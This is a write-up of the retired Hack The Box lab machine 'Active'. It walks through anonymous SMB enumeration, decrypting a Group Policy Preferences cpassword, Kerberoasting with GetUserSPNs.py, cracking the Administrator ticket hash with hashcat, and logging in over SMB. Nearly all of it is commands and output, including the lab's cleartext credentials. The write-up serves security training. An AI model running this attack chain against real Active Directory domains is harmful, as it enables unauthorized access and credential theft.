---
machine: Active
platform: Hack The Box
category: AD
os: Windows
difficulty: Easy
points: 20
tags: [gpp-cpassword, kerberoasting, smb, active-directory, ldap]
date: 2026-05-04
status: retired
summary: "A beginner-friendly Active Directory box covering the domain-attack fundamentals: anonymous SMB enumeration, a legacy Group Policy Preferences credential exposure, and Kerberoasting — a clean introduction to chaining small AD misconfigurations into full domain compromise."
---
## Enumeration

I first ran a nmap scan on the ip `10.129.56.252`

Enumerate SMB and check for anonymous logon: `crackmapexec smb 10.129.56.252 -u '' -p ''`

Find one Read Access share `Replication` and investigate it for credentials or encrypted credentials. Spider it with `crackmapexec smb 10.129.56.252 -u '' -p '' --spider Replication --regex ".*"` and `crackmapexec smb 10.129.56.252 -u '' -p '' --spider Replication --regex ".xml"`, find the interesting file `Groups.xml`, then get and view it:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

For user `SVC_TGS` in domain `active.htb` we see an AES-256 encrypted password `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`. This is GPP or Group Policy Preferences, all cpasswords are encrypted with a published microsoft key making it decryptable with `gpp-decrypt` giving us `GPPstillStandingStrong2k18`.

## Foothold

We now have a credential pair for `SVC_TGS:GPPstillStandingStrong2k18` we can enumerate further with enum4linux with our credential pair, check the SMB Users share with the creds, and use the domain user credentials to perform Kerberoasting to get a hash we can crack offline to move laterally or escalate. That means running `enum4linux -a -u "SVC_TGS" -p "GPPstillStandingStrong2k18" 10.129.56.252`, checking the share with `smbclient //10.129.56.252/Users -U "active.htb/SVC_TGS%GPPstillStandingStrong2k18"`, and then `GetUserSPNs.py active.htb/SVC_TGS:<password> -dc-ip 10.129.56.252` -> Gets kerberoastable accounts (domain accounts with SPNs). To get the crackable RC4 hash we use the `-request` flag `# Check for kerberoastable accounts GetUserSPNs.py active.htb/SVC_TGS:<password> -dc-ip 10.129.56.252 -request`

```bash
Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-05-04 09:09:54.106940             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$669aa0c1aa17ec02e6769fbd06b3495d$48760854e0fab02b88971a184315986f91e39d5a89223c5b51c88ad136a42eda1f973528b7faf057a026e28c5f8504cba3f5db15297457d8f3b3ae3012ece9dcd2e6dc0e4a9be41cef8feb35a1290f0220cd79eb2dd62a82b80a6ee467567da1e83d3b6e353cca52bcd064c769a1d1bcec59d59cd1a3b0b8db82cdbba86f3638d18f81ff06dfdd93a27245ff186e4ab18fdab0127257aa465683f70d00590a8dcdfdc648885d0c401e14eabdd97b1d709cf4198bf58c50898b8cb4c1e806ff0b65333cd32f3e75a782ba990963e476f77ead81b8dd2f68fa1ec435dbcdeff8ba60680c3b9ad696326488101be46270280c56ccd095295145e178750efc0f5cb6cced18aa035ae0a59b3072496a4655b39431b39d980233c8f0953961e69fec7d709549a541e28d188be63151ee0bf200fb18e9be03faae4a64d5c5e27f378b7de2999054b1efea6808594944694fa9a4e596e607a82c4b6d8865615d9b88c66a0b913195c6541bed430b009391b657a78270a9b960be98b6ebe7653eb4c7b42cd9253db41bb58d4dad0480c1ccddb43222b88eb16c494ed18df009573afa2fe542d15a6e76fb43b8915eebe8bb55fc02459fa60c2835bd4ca2de95db76b4481252f96bd54536f56ece164be4eeb39d29c63edcf48400e0fabe4206f225675a5d884edb035a39b11088404b932592250d37a1f7061da84f17c04641f82f6ede4c0fdd9c469cc526fe8d2cad0f2d8614fd410842d8125ddb2342fe7878ac007dc525fee279ec6554b359c57282a91e3618bf2c30c8045fa83b9df4f89738357e46d775bb75a2730aa3703f47a06a42afdc8d7dca0220f8ce0029e1e868a6f59fbf655b0bff78a229c7c0d379a7af1cae77dbe9b5aa46b48a8a345fa1b444d4e5e4dcb0f1aa0bdbec4042f0ff2927a5dfab6a7ec6d372dfe8022d645027289c95cfa6b224c2f372156c4d1da7a1fedf1dd243045c64b12c1c100349336dca1dfad80f85376be15d604a752989e7ffdad6e2acc570f9081d222b935bf1051426fb8c4651029ef625b4b5f536e2cb879ce1f254b3dbf03ff37d87bd9c8a5f5d6679f447fb351d5ff454d585c794a47add3f46976c4351cb0b2707435ff523f3215b6bd21c7a2d4e4f1c75816108d9e410a712cba13d1f22b8e42848c53e662c7613c01f71db54d40330dd3e6552a460963f544032385caf70fd2c3406d2f748ea854233941e68be58d0fdb60d852434c1b63fee03199ec137c49da334
```

## Privilege Escalation

We can then take this hash and crack the `Administrator` account with hashcat offline:

```bash
echo '$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$669aa0c1aa17ec02e6769fbd06b3495d$48760854e0fab02b88971a184315986f91e39d5a89223c5b51c88ad136a42eda1f973528b7faf057a026e28c5f8504cba3f5db15297457d8f3b3ae3012ece9dcd2e6dc0e4a9be41cef8feb35a1290f0220cd79eb2dd62a82b80a6ee467567da1e83d3b6e353cca52bcd064c769a1d1bcec59d59cd1a3b0b8db82cdbba86f3638d18f81ff06dfdd93a27245ff186e4ab18fdab0127257aa465683f70d00590a8dcdfdc648885d0c401e14eabdd97b1d709cf4198bf58c50898b8cb4c1e806ff0b65333cd32f3e75a782ba990963e476f77ead81b8dd2f68fa1ec435dbcdeff8ba60680c3b9ad696326488101be46270280c56ccd095295145e178750efc0f5cb6cced18aa035ae0a59b3072496a4655b39431b39d980233c8f0953961e69fec7d709549a541e28d188be63151ee0bf200fb18e9be03faae4a64d5c5e27f378b7de2999054b1efea6808594944694fa9a4e596e607a82c4b6d8865615d9b88c66a0b913195c6541bed430b009391b657a78270a9b960be98b6ebe7653eb4c7b42cd9253db41bb58d4dad0480c1ccddb43222b88eb16c494ed18df009573afa2fe542d15a6e76fb43b8915eebe8bb55fc02459fa60c2835bd4ca2de95db76b4481252f96bd54536f56ece164be4eeb39d29c63edcf48400e0fabe4206f225675a5d884edb035a39b11088404b932592250d37a1f7061da84f17c04641f82f6ede4c0fdd9c469cc526fe8d2cad0f2d8614fd410842d8125ddb2342fe7878ac007dc525fee279ec6554b359c57282a91e3618bf2c30c8045fa83b9df4f89738357e46d775bb75a2730aa3703f47a06a42afdc8d7dca0220f8ce0029e1e868a6f59fbf655b0bff78a229c7c0d379a7af1cae77dbe9b5aa46b48a8a345fa1b444d4e5e4dcb0f1aa0bdbec4042f0ff2927a5dfab6a7ec6d372dfe8022d645027289c95cfa6b224c2f372156c4d1da7a1fedf1dd243045c64b12c1c100349336dca1dfad80f85376be15d604a752989e7ffdad6e2acc570f9081d222b935bf1051426fb8c4651029ef625b4b5f536e2cb879ce1f254b3dbf03ff37d87bd9c8a5f5d6679f447fb351d5ff454d585c794a47add3f46976c4351cb0b2707435ff523f3215b6bd21c7a2d4e4f1c75816108d9e410a712cba13d1f22b8e42848c53e662c7613c01f71db54d40330dd3e6552a460963f544032385caf70fd2c3406d2f748ea854233941e68be58d0fdb60d852434c1b63fee03199ec137c49da334' > crackme
hashcat -m 13100 crackme /usr/share/wordlists/rockyou.txt
```

We find the password is Ticketmaster1968 so we have `Administrator:Ticketmaster1968`. We can get the root password from `smbclient //10.129.56.252/Users -U "active.htb/Administrator%Ticketmaster1968"`
